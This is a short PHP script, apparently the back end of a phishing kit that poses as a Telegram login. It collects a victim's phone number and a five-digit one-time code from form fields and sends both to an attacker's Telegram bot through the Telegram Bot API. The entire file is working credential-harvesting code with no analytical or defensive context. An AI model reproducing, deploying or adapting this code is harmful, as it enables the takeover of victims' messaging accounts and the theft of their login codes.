<?php
include "../telegram.php";
session_start();
$phone = $_SESSION['phoneNumber'];
$pin1 = $_POST['pin1'];
$pin2 = $_POST['pin2'];
$pin3 = $_POST['pin3'];
$pin4 = $_POST['pin4'];
$pin5 = $_POST['pin5'];
$pin = $pin1 . $pin2 . $pin3 . $pin4 . $pin5;
$_SESSION['pin'] = $pin;
$message = "
( Telegram | OTP | " . $phone . " )

- No HP : " . $phone . "
- Code OTP : " . $pin . " via Telegram
 ";
function sendMessage($id_telegram, $message, $id_botTele)
{
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
